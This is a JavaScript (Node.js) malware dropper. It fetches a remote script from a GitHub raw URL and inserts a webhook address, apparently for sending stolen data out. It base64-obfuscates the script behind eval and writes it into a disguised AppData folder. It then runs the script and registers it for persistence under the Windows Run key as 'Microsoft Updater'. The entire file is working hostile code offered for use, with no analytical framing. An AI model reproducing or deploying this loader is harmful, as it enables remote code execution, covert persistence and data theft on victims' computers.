const fs = require("fs");
const https = require("https");
const path = require("path");
const os = require("os");
const { exec } = require("child_process");

const H00K3_URL = "%WEBHOOK%"; 
const fileUrl = "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/4i5tyydshnyi.js";

const appData = process.env.APPDATA || path.join(os.homedir(), "AppData", "Roaming");
const targetDir = path.join(appData, "Microsoft", "Net", "System", "My", "CTLs");
const targetFile = path.join(targetDir, "index.js");

function downloadReplaceObfuscate(url, dest, webhook, cb) {
  https.get(url, (res) => {
    let data = "";
    res.on("data", (chunk) => data += chunk);
    res.on("end", () => {
      const replaced = data.replace(/const H00K\s*=\s*["']%WEBHOOK%["'];/, `const H00K = "${webhook}";`);
      const obfuscated = Buffer.from(replaced).toString("base64");

      const wrapped = `
const { Buffer } = require('buffer');
eval(Buffer.from("${obfuscated}", "base64").toString("utf-8"));
      `.trim();

      fs.mkdirSync(path.dirname(dest), { recursive: true });
      fs.writeFileSync(dest, wrapped);
      cb();
    });
  }).on("error", () => cb());
}

function adicionarStartup(scriptPath) {
  const regPath = `"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"`;
  const startupName = "Microsoft Updater";
  const cmd = `reg add ${regPath} /v "${startupName}" /t REG_SZ /d "node \\"${scriptPath}\\"" /f`;
  exec(cmd);
}

downloadReplaceObfuscate(fileUrl, targetFile, H00K3_URL, () => {
  exec(`node "${targetFile}"`, () => {
    adicionarStartup(targetFile);
  });
});
